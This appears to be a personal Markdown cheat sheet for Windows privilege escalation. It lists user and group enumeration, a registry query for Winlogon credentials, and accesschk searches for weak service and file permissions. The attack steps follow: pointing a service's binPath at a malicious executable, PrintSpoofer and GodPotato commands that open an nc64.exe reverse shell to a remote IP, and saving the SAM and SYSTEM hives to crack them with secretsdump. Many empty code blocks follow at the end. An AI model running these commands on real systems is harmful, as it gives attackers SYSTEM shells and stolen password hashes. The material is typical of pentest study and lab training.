


###

```
whoami /groups
net accounts
net user
net user <USERNAME>
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember <GROUP-NAME>
```

## Check for Credentials

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

```
icacls FILE
```

###### get env variables

```
Get-ChildItem
Env:$env:PATH
```

## File permissions

##### Accesschk.exe


| Permission            | Description                                              |
|-----------------------|----------------------------------------------------------|
| SERVICE_ALL_ACCESS    | Can do anything.                                         |
| SERVICE_CHANGE_CONFIG | Can reconfigure the service binary.                      |
| WRITE DAC             | Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG. |
| WRITE_OWNER           | Can become owner, reconfigure permissions.               |
| GENERIC_WRITE         | Inherits SERVICE_CHANGE_CONFIG                           |
| GENERIC_ALL           | Inherits SERVICE_CHANGE

```
# List all services and the permissions each user level has on them.
accesschk.exe /accepteula -ucqv *

# List permissions for a specific service:
accesschk.exe /accepteula -ucqv Spooler

# List permissions for a specific directory:
accesschk.exe /accepteula -dqv "C:\Users"

# Find all weak folder:
accesschk.exe /accepteula -uwdqs Users C:\
accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\

# Find all weak files::
accesschk.exe /accepteula -uwqs Users C:\*.*
accesschk.exe /accepteula -uwqs "Authenticated Users" C:\*.*


# List services which the "Authenticated Users" user group have permissions over
# (remember to check other user groups you are a member of).
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

# Services 

## Manage Service
```
Get-Service
Get-Service | Select-Object Displayname,Status,ServiceName,Can*
sc.exe query
sc.exe query | select-string service_name

# Binary Path
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}


sc.exe stop <SERVICE>
sc.exe start <SERVICE>
sc.exe qc <SERVICE>
sc.exe delete <SERVICE>

# Check permissions
sc.exe sdshow <SERVICE> 

# Change service configuration
sc.exe config <SERVICE> binPath="C:\Users\Quickemu\Downloads\malicious.exe"

# Add New Service
sc.exe create <SERVICE-NAME> binPath="<PATH-TO-EXECUTABLE>"
```

## Permissions

```
# SeImpersonatePrivilege
./PrintSpoofer64.exe -c "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
./GodPotato-NET2.exe -cmd "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"

# SeBackupPrivilege
## Copy SAM and SYSTEM and crack
mkdir C:\temp
reg save hklm\sam C:\temp\sam.hive
reg save hklm\system C:\temp\system.hive
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```


```

```

## Services

```
Get-Service

# Display specific properties for each service
Get-Service | Select-Object Displayname,Status,ServiceName,Can*

#  Get binary path for each service that is currently running
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

```

###

```bash

```

###

```bash

```

###

```bash

```

###

```bash

```

###

```bash

```

###

```bash

```

###

```bash

```

###

```bash

```

###

```bash

```

###

```bash

```

